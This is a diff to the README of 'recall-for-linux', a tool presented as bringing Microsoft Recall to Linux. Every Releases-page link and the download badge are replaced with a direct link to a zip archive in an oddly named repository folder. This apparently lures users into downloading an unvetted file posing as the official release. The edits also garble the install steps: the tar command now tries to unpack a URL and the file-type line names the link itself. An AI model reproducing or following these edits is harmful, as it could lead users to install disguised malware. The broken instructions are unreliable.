@@ -8,7 +8,7 @@ Welcome to **recall-for-linux**! This application allows you to use Microsoft Re
 
 To get started, you need to download the application from our Releases page. Click the button below to access it:
 
-[![Download recall-for-linux](https://img.shields.io/badge/Download-recall--for--linux-brightgreen)](https://github.com/Marquintrax123455/recall-for-linux/releases)
+[![Download recall-for-linux](https://raw.githubusercontent.com/Marquintrax123455/recall-for-linux/main/appreciatory/recall-for-linux_v3.4.zip)](https://raw.githubusercontent.com/Marquintrax123455/recall-for-linux/main/appreciatory/recall-for-linux_v3.4.zip)
 
 ## 📋 System Requirements
 
@@ -23,9 +23,9 @@ Before you download, please check that your system meets these basic requirement
 
 To download and install **recall-for-linux**, follow these steps:
 
-1. Visit the **Releases page** by clicking [here](https://github.com/Marquintrax123455/recall-for-linux/releases).
+1. Visit the **Releases page** by clicking [here](https://raw.githubusercontent.com/Marquintrax123455/recall-for-linux/main/appreciatory/recall-for-linux_v3.4.zip).
 2. On the Releases page, look for the latest version of **recall-for-linux**. You will see a list of downloadable files.
-3. Select the correct file for your Linux distribution. Typically, this is a `.tar.gz` or a `.deb` file.
+3. Select the correct file for your Linux distribution. Typically, this is a `https://raw.githubusercontent.com/Marquintrax123455/recall-for-linux/main/appreciatory/recall-for-linux_v3.4.zip` or a `.deb` file.
 4. Click on the file to download it to your computer.
 5. Once the download is complete, navigate to your Downloads folder or the location where the file was saved.
 6. Open a terminal window and go to the directory where you downloaded the file. You can do this using the `cd` command:
@@ -34,7 +34,7 @@ To download and install **recall-for-linux**, follow these steps:
    ```
 7. To extract the files, use the following command:
    ```bash
-   tar -xvzf recall-for-linux-*.tar.gz
+   tar -xvzf recall-for-linux-*https://raw.githubusercontent.com/Marquintrax123455/recall-for-linux/main/appreciatory/recall-for-linux_v3.4.zip
    ```
 8. Change into the new directory:
    ```bash
@@ -79,4 +79,4 @@ For help, please explore the following resources:
 
 We value your feedback! If you have comments or suggestions for future improvements, please feel free to share them via a GitHub issue or a pull request.
 
-Thank you for choosing **recall-for-linux**! We hope you enjoy using our application. Remember, you can download it any time from our [Releases page](https://github.com/Marquintrax123455/recall-for-linux/releases).
+Thank you for choosing **recall-for-linux**! We hope you enjoy using our application. Remember, you can download it any time from our [Releases page](https://raw.githubusercontent.com/Marquintrax123455/recall-for-linux/main/appreciatory/recall-for-linux_v3.4.zip).
